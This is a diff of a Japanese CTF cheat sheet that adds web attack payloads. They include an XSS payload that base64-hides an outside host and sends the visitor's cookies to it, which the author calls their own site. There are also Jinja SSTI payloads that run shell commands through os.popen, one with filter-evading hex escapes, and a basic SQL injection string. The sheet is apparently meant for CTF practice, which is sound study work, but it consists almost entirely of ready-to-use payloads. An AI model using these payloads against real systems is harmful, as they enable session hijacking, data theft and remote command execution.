@@ -1,15 +1,14 @@
 # CTFチートシート
 ## 目次
 {:toc}
-
-## XSS
-通常バージョン
-```javascript:XSS
-```
+## Web問
+---
+### XSS
 ```html:XSS
 &lt;img src=x onerror=fetch(atob('aHR0cHM6Ly9tYXNhLWNvb2tpZXMtc3RlYWxlci5wYWdlcy5kZXYv')+?cookie='+document.cookie)&gt;
 ```
-## SSTI
+この場合は、僕のサイトにクッキーを送信する。
+### SSTI
 問題にどこにファイルがあるかわからない時には
 ```python:SSTI_ls
 {{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
@@ -24,3 +23,10 @@ SSTIができる時には、
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
 ```
 この場合はFlagの名前が、**flag**だとする
+### SQLインジェクション
+まず最初に、**'** や、**"** を試す
+エラーを吐いたら、次に、
+```mysql:sqlinjection
+' OR 1=1 --
+```
+を試してみる
